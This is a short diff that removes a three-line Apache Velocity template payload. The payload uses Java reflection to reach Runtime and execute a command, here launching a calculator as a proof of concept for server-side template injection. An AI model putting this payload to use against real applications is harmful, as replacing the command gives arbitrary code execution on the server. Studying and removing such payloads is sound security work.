@@ -1,3 +1,0 @@
-#set($exp=$username.getClass().forName("java.lang.Runtime").getRuntime())
-#set($cmd="gnome-calculator")
-$exp.exec($cmd)
